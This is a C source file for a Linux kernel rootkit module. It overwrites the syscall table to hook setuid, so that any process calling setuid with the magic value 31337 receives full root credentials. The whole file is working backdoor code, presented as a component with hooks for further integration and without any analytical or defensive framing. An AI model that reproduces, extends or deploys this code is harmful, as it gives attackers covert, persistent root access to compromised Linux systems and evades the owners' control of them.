#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/cred.h>
#include <linux/syscalls.h>
#include <linux/sched.h>

#include "syscall_table.h"
#include "hook_defs.h"
#include "kill_hook.h" //for future fucking integrations of yours

#define MAGIC_ROOT_UID 31337

asmlinkage long (*original_setuid)(uid_t uid);

asmlinkage long hooked_setuid(uid_t uid)
{
    if (uid == MAGIC_ROOT_UID) {
        struct cred *new_creds;

        new_creds = prepare_creds();
        if (new_creds == NULL)
            return -ENOMEM;

        new_creds->uid.val = 0;
        new_creds->gid.val = 0;
        new_creds->euid.val = 0;
        new_creds->egid.val = 0;
        new_creds->suid.val = 0;
        new_creds->sgid.val = 0;
        new_creds->fsuid.val = 0;
        new_creds->fsgid.val = 0;

        commit_creds(new_creds);
        return 0;
    }

    return original_setuid(uid);
}

void enable_cred_hook(unsigned long **syscall_table)
{
    original_setuid = (void *)syscall_table[__NR_setuid];
    disable_write_protection();
    syscall_table[__NR_setuid] = (unsigned long *)hooked_setuid;
    enable_write_protection();
}

void disable_cred_hook(unsigned long **syscall_table)
{
    disable_write_protection();
    syscall_table[__NR_setuid] = (unsigned long *)original_setuid;
    enable_write_protection();
}
